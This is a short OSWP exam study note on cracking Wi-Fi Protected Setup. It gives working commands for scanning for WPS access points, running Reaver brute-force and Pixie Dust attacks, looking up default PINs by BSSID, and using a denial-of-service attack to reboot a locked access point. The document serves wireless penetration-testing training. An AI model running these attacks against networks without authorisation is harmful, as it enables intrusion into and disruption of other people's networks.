---
{"dg-publish":true,"permalink":"/oswp/e-wps-cracking/"}
---

----------------
### Scan for APs with WPS:
- Using Wash:
```
wash -i wlan0mon
```
- Add -5 for 5GHz
- _Lck_ indicates if WPS is locked, i.e. attack is pointless at that time
- Using Airodump:
```
sudo airodump-ng wlan0mon --wps
```

-----------
### Reaver default attack:
```
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
```
- If Reaver won't switch channels and is stuck on "Waiting for beacon from..." add the -c parameter and specify the channel
- Test for empy pin: -p
--------------
### PixieWPS attack:
```
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K
```

-------------------------
### BSSID-dependent PIN attack:
1. Load PINs into memory:
```
source /usr/share/airgeddon/known_pins.db
```
2. Check database for first six characters of BSSID:
```
echo ${PINDB["0013F7"]}
```
3. Verify outputted PINs

----
### Common errors:
Problem: Trying PixieWPS PIN with reaver:
```
[!] WPS transaction failed (code: 0x03), re-trying last pin
```
Solution: Restart reaver without PixieWPS option or try alternative wireless card.

Problem: Reaver may keep trying the same PIN in verbose mode:
```
[+] Sending identity response
[+] Received identity request
```
Solution: Try different wireless card with different chipset.

Problem: WPS is locked
Solution: Perform DoS using mdk3/4 or other to make AP reboot